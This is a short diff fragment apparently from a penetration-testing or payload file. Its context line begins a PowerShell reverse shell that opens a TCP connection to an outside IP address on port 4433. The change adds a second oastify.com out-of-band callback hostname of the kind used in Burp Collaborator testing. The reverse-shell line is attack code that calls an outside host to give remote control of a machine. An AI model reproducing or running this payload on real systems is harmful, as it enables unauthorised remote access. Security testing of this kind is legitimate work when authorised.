@@ -7,3 +7,5 @@ $client = New-Object System.Net.Sockets.TCPClient('98.84.52.2',4433);$stream = $
 
 
 er9z37onpigb8b6h5qtduqfz2q8kwakz.oastify.com
+
+hcxpaukbhotpw9wcljuy2ia1eskj89wy.oastify.com
